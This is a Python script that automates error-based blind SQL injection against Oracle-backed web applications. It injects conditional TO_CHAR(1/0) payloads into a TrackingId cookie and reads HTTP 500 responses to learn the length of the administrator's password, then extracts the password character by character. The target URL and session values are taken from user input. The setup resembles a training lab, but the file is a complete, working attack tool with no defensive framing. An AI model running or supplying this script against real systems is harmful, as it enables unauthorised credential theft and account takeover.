# 🔒 Error-Based Blind SQLi Automation (Oracle Version)
# ✨ Works specifically for Oracle-based databases using TO_CHAR(1/0) for conditional error.
# 💡 To adapt for MySQL, PostgreSQL, etc., modify the payload logic accordingly.

import requests
import string
import time

# User input for dynamic attack
url = input("🔗 Enter target URL (e.g., https://site.com/filter?category=...): ").strip()
base_tracking_id = input("🍪 Enter TrackingId value: ").strip()
session_id = input("🔐 Enter Session ID: ").strip()

# Character set to test (can be expanded to special chars if needed)
characters = string.ascii_lowercase + string.digits + string.ascii_uppercase

def get_length():
    print("\n[*] Finding password length using error-based SQLi...")
    for i in range(1, 51):
        payload = f"'||(SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))={i} THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
        cookies = {
            'TrackingId': base_tracking_id + payload,
            'session': session_id
        }
        r = requests.get(url, cookies=cookies)
        print(f"Trying length: {i} - Status: {r.status_code}")
        if r.status_code == 500:
            print(f"[+] Password length found: {i}")
            return i
        time.sleep(0.2)
    print("[-] Could not determine length.")
    return 0

def get_password(length):
    print("[*] Extracting password character by character...")
    password = ""
    for i in range(1, length + 1):
        for char in characters:
            payload = f"'||(SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
            cookies = {
                'TrackingId': base_tracking_id + payload,
                'session': session_id
            }
            r = requests.get(url, cookies=cookies)
            print(f"Trying position {i}: {char} - Status: {r.status_code}", end="\r")
            if r.status_code == 500:
                password += char
                print(f"\n[+] Found character {i}: {char}")
                break
            time.sleep(0.2)
    return password

# Launch the attack
length = get_length()
if length > 0:
    password = get_password(length)
    print(f"\n✅ Administrator Password: {password}")
else:
    print("✖️ Could not determine password length.")
